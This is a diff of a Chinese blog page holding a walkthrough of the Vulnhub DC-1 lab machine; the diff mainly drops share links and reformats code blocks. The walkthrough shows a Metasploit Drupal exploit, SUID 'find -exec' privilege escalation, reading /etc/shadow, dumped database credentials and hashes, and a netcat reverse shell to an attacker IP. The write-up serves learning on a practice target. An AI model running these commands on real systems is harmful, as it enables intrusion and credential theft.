@@ -111,30 +111,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/08/27%20Vulnhub%20Tre%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&text=DC-1 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&title=DC-1 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&is_video=false&description=DC-1 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=DC-1 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&title=DC-1 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&title=DC-1 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&title=DC-1 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&title=DC-1 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&name=DC-1 Writeup&description=&lt;p&gt;靶机难度不高。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/10/DC-1%20Writeup/&t=DC-1 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1-get-shell"><span class="toc-number">2.2.</span> <span class="toc-text">http服务 + get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-%E7%AE%80%E5%8D%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">方法1-简单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E5%B8%B8%E8%A7%84"><span class="toc-number">2.3.2.</span> <span class="toc-text">方法2-常规</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
@@ -161,8 +143,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-09T16:00:00.000Z" itemprop="datePublished">2022-05-10</time>
-        
-        (Updated: <time datetime="2022-05-11T02:37:16.278Z" itemprop="dateModified">2022-05-11</time>)
         
       
     </div>
@@ -205,9 +185,7 @@
 </ul>
 <h1 id="渗透">渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.35
-<span class="token function">sudo</span> nmap -p22,80,111,49821 -A <span class="token number">10.0</span>.2.35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.35</span><br><span class="line">sudo nmap -p22,80,111,49821 -A 10.0.2.35</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113213.png" /></p>
 <h2 id="http服务-get-shell">http服务 + get shell</h2>
 <p>直接访问80端口，是一个登录界面，可以看到CMS是drupal。</p>
@@ -219,51 +197,25 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113546.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113720.png" /></p>
 <p>从 Rank 为 excellent 且最新的漏洞开始尝试，也就是第2个。</p>
-<pre class="line-numbers language-metasploit" data-language="metasploit"><code class="language-metasploit">1. use 1
-2. show options
-3. set rhost 10.0.2.35
-4. run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. use 1</span><br><span class="line">2. show options</span><br><span class="line">3. set rhost 10.0.2.35</span><br><span class="line">4. run</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113918.png" /></p>
-<p>打开shell，并用python进行简单升级 <pre class="line-numbers language-metasploit" data-language="metasploit"><code class="language-metasploit">1. shell
-2. which python
-3. python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>打开shell，并用python进行简单升级 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. shell</span><br><span class="line">2. which python</span><br><span class="line">3. python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114053.png" /></p>
 <h2 id="权限提升">权限提升</h2>
 <h3 id="方法1-简单">方法1-简单</h3>
-<p>首先进行常规的信息收集，但在找suid权限的文件的时候看到了可疑的文件： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -ls <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>首先进行常规的信息收集，但在找suid权限的文件的时候看到了可疑的文件： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114249.png" /></p>
-<p>Linux中 find 命令可以利用 -exec 命令执行其他系统命令，因此可以使用下面的命令进行提权： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> -exec /bin/sh <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>Linux中 find 命令可以利用 -exec 命令执行其他系统命令，因此可以使用下面的命令进行提权： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114352.png" /></p>
 <p>接下来直接读取flag即可，但是有一个现在还读不到。</p>
 <blockquote>
 <p>注意：这里只能使用/bin/sh提权，而不能使用/bin/bash，不知道为什么。</p>
 </blockquote>
 <h3 id="方法2-常规">方法2-常规</h3>
-<p>得到www-data的shell之后，在当前目录找到了第一个flag <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-1:/var/www$ <span class="token function">cat</span> flag1.txt
-<span class="token function">cat</span> flag1.txt
-Every good CMS needs a config <span class="token function">file</span> - and so <span class="token keyword">do</span> you.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>得到www-data的shell之后，在当前目录找到了第一个flag <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br></pre></td></tr></table></figure></p>
 <p>这个flag其实是一个提示，大致的意思：“好的CMS都需要一个配置文件，你也需要”。因此解析来需要去找配置文件。</p>
 <p>最开始还以为是当前目录的web-config，结果查看之后并不是，反而解释了为什么很多文件访问都是403，因为该文件做了过滤。</p>
-<p>最终在/var/www/sites/default目录下找到了配置文件settings.php，查看该文件，取出最终要的内容： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/**
- *
- * flag2
- * Brute force and dictionary attacks aren't the
- * only ways to gain access (and you WILL need access).
- * What can you do with these credentials?
- *
- */
-
-
-'database' => 'drupaldb',
-'username' => 'dbuser',
-'password' => 'R0ck3t',
-'host' => 'localhost',
-'port' => '',
-'driver' => 'mysql',
-'prefix' => '',
-
-
-$drupal_hash_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最终在/var/www/sites/default目录下找到了配置文件settings.php，查看该文件，取出最终要的内容： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">&#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">&#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">&#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">&#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">&#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$drupal_hash_salt = &#x27;X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs&#x27;;</span><br></pre></td></tr></table></figure></p>
 <p>得到flag2，大致意思为：“暴力破解不是访问的唯一方法，但是你需要访问它，你能利用这些信息做些什么呢？”</p>
 <p>利用得到的信息登录数据库，查看drupaldb数据库的users表的信息</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115232.png" /></p>
@@ -275,54 +227,18 @@ $drupal_hash_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';<span aria-hid
 <p>查看报错信息，找到对应的源码</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510120048.png" /></p>
 <p>/var/www/scripts目录下并没有这两个文件，而/var/www目录下才有。因此其实有两种方法：第一种就是修改这两行代码，改成绝对路径（理论上可以，我没尝试过）；第二种就是回到/var/www目录执行。</p>
-<p>显然使用第二种 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@DC-1:/var/www$ php scripts/password-hash.sh <span class="token string">"m1ku"</span>
-php scripts/password-hash.sh <span class="token string">"m1ku"</span>
-
-password: m1ku   hash: <span class="token variable">$S</span><span class="token variable">$DYr4</span>.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>然后再次连接mysql，修改admin的密码。 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1. use drupaldb
-2. update users set pass&#x3D;&quot;$S$DYr4.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT&quot; where uid&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>显然使用第二种 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh <span class="string">&quot;m1ku&quot;</span></span><br><span class="line">php scripts/password-hash.sh <span class="string">&quot;m1ku&quot;</span></span><br><span class="line"></span><br><span class="line">password: m1ku   <span class="built_in">hash</span>: $S<span class="variable">$DYr4</span>.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT</span><br></pre></td></tr></table></figure></p>
+<p>然后再次连接mysql，修改admin的密码。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. use drupaldb</span><br><span class="line">2. update users set pass=&quot;$S$DYr4.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT&quot; where uid=1;</span><br></pre></td></tr></table></figure></p>
 <p>回到网站，使用刚刚修改的密码登录admin，登录进去之后点击左上角的 Dashboard找到</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510120639.png" /></p>
-<p>查看flag3（） <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>查看flag3（） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure></p>
 <p>大致意思为：“特殊的权限将会帮助你找到密码，但是你需要知道如何使用 -exec 命令去获得 shadow 中的信息”。其实提示很明显了，perms, find, -exec, passwd, shadow 都是Linux中的。</p>
-<p>因此，接下来使用下面命令读取/etc/shadow中的信息 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> -exec <span class="token function">cat</span> /etc/shadow <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token comment"># 最好到一个文件不多的目录，否则会重复好多次</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>得到： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::
-daemon:*:17946:0:99999:7:::
-bin:*:17946:0:99999:7:::
-sys:*:17946:0:99999:7:::
-sync:*:17946:0:99999:7:::
-games:*:17946:0:99999:7:::
-man:*:17946:0:99999:7:::
-lp:*:17946:0:99999:7:::
-mail:*:17946:0:99999:7:::
-news:*:17946:0:99999:7:::
-uucp:*:17946:0:99999:7:::
-proxy:*:17946:0:99999:7:::
-www-data:*:17946:0:99999:7:::
-backup:*:17946:0:99999:7:::
-list:*:17946:0:99999:7:::
-irc:*:17946:0:99999:7:::
-gnats:*:17946:0:99999:7:::
-nobody:*:17946:0:99999:7:::
-libuuid:!:17946:0:99999:7:::
-Debian-exim:!:17946:0:99999:7:::
-statd:*:17946:0:99999:7:::
-messagebus:*:17946:0:99999:7:::
-sshd:*:17946:0:99999:7:::
-mysql:!:17946:0:99999:7:::
-flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>其中flag4和root的密码都是加密过的，可以使用john爆破，root没爆破出来，但是flag4的可以直接爆破。（也可以使用hydra直接ssh连接爆破flag4）最终得到的明文密码为 orange。利用该密码登录flag4，在家目录找到flag4 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag4@DC-1:~$ <span class="token function">cat</span> flag4.txt
-Can you use this same method to <span class="token function">find</span> or access the flag <span class="token keyword">in</span> root?
-
-Probably. But perhaps it's not that easy.  Or maybe it is?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>获取root权限还是使用find，这里使用另一个命令 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> -exec <span class="token function">nc</span> <span class="token number">10.0</span>.2.4 <span class="token number">5555</span> -e /bin/bash <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>因此，接下来使用下面命令读取/etc/shadow中的信息 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> cat /etc/shadow \; <span class="comment"># 最好到一个文件不多的目录，否则会重复好多次</span></span><br></pre></td></tr></table></figure></p>
+<p>得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
+<p>其中flag4和root的密码都是加密过的，可以使用john爆破，root没爆破出来，但是flag4的可以直接爆破。（也可以使用hydra直接ssh连接爆破flag4）最终得到的明文密码为 orange。利用该密码登录flag4，在家目录找到flag4 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br></pre></td></tr></table></figure></p>
+<p>获取root权限还是使用find，这里使用另一个命令 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -<span class="built_in">exec</span> nc 10.0.2.4 5555 -e /bin/bash \;</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510122415.png" /></p>
-<p>最后，读取第5个flag，/root/fonalflag.txt <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Well done<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
-
-Hopefully you've enjoyed this and learned some new skills.
-
-You can <span class="token builtin class-name">let</span> me know what you thought of this little journey
-by contacting me via Twitter - @DCAU7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最后，读取第5个flag，/root/fonalflag.txt <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">总结</h1>
 <p>该靶机难度比较简单，涉及如下知识点：</p>
 <ol type="1">
@@ -386,7 +302,6 @@ by contacting me via Twitter - @DCAU7<span aria-hidden="true" class="line-number
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
